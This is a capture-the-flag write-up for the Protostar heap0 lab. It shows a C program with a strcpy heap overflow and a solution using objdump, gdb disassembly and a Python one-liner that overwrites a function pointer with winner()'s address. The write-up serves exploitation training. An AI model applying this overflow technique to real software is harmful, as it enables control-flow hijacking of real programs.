#### Protostar Heap0 

##### About
This level introduces heap overflows and how they can influence code flow.  
  
This level is at /opt/protostar/bin/heap0

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();
}
```

##### Solution
```
$ objdump -t heap0 | grep winner
08048464 g     F .test  00000014              winner
08048478 g     F .test  00000014              nowinner

$ gdb heap0
......
(gdb )disas main
Dump of assembler code for function main:
0x0804848c <+0>:    push   %ebp
0x0804848d <+1>:    mov    %esp,%ebp
0x0804848f <+3>:    and    $0xfffffff0,%esp
0x08048492 <+6>:    sub    $0x20,%esp
0x08048495 <+9>:    movl   $0x40,(%esp)
0x0804849c <+16>:   call   0x8048388 <malloc@plt>    ; d = malloc(64)
0x080484a1 <+21>:   mov    %eax,0x18(%esp)           ; store pointer
0x080484a5 <+25>:   movl   $0x4,(%esp)
0x080484ac <+32>:   call   0x8048388 <malloc@plt>    ; f = malloc(4)
0x080484b1 <+37>:   mov    %eax,0x1c(%esp)           ; store pointer
0x080484b5 <+41>:   mov    $0x8048478,%edx
0x080484ba <+46>:   mov    0x1c(%esp),%eax
0x080484be <+50>:   mov    %edx,(%eax)               ; f->fp = nowinner()
......
0x080484e7 <+91>:   mov    0x18(%esp),%eax
0x080484eb <+95>:   mov    %edx,0x4(%esp)
0x080484ef <+99>:   mov    %eax,(%esp)
0x080484f2 <+102>:  call   0x8048368 <strcpy@plt>    ; overflow d
0x080484f7 <+107>:  mov    0x1c(%esp),%eax
0x080484fb <+111>:  mov    (%eax),%eax
0x080484fd <+113>:  call   *%eax                     ; nowinner()
......
(gdb) quit

$ ./heap0 AAAA
data is at 0x804a008, fp is at 0x804a050
level has not been passed

$ ./heap0 `python -c 'print "A"*72+"\x64\x84\x04\x08"'`
data is at 0x804a008, fp is at 0x804a050
level passed
```

##### Reference
<https://thesprawl.org/research/exploit-exercises-protostar-heap/#heap-0>  
<https://www.mattandreko.com/2012/01/10/exploit-exercises-heap-0/>
